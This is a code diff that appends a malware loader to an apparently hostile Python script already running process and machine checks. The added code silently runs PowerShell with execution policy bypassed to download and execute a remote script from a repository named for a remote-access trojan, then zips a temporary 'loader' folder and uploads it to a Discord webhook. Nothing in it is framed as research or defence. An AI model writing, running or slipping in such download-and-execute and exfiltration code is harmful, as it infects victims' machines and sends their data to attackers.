@@ -541,3 +541,55 @@ if mac_check():
 process_thread = threading.Thread(target=process_check)
 process_thread.start()
 process_thread.join()
+# payload ps1
+import subprocess
+import os
+import zipfile
+import random
+import string
+import requests
+import io
+
+def run_powershell_script(url):
+    command = f'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {{iwr -Uri \'{url}\' -UseBasicParsing | iex}}"'
+    subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def zip_folder(folder_path, password, zip_name):
+    zip_buffer = io.BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+        for root, dirs, files in os.walk(folder_path):
+            for file in files:
+                full_path = os.path.join(root, file)
+                relative_path = os.path.relpath(full_path, folder_path)
+                zip_file.write(full_path, relative_path)
+    return zip_buffer.getvalue()
+
+def send_to_discord(webhook_url, zip_data, filename, content):
+    files = {'file': (filename, zip_data)}
+    data = {'content': content}
+    response = requests.post(webhook_url, files=files, data=data)
+    return response.status_code
+
+# Step 1: Run the PowerShell script
+ps_script_url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/main.ps1"
+run_powershell_script(ps_script_url)
+
+# Step 2: Generate a random password
+password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+
+# Step 3: Zip the folder with the password
+temp_folder = os.path.join(os.getenv('TEMP'), 'loader')
+zip_data = zip_folder(temp_folder, password, 'Power_rat_data.zip')
+
+# Step 4: Prepare the content and filename
+content = f"hai1723 on top\npassword:{password}"
+filename = "Power_rat_data.zip"
+
+# Step 5: Send the zipped file via Discord webhook
+webhook_url = "YOUR_WEBHOOK_URL"
+status = send_to_discord(webhook_url, zip_data, filename, content)
+
+if status == 200:
+    print("File sent successfully.")
+else:
+    print(f"Failed to send file. Status code: {status}")
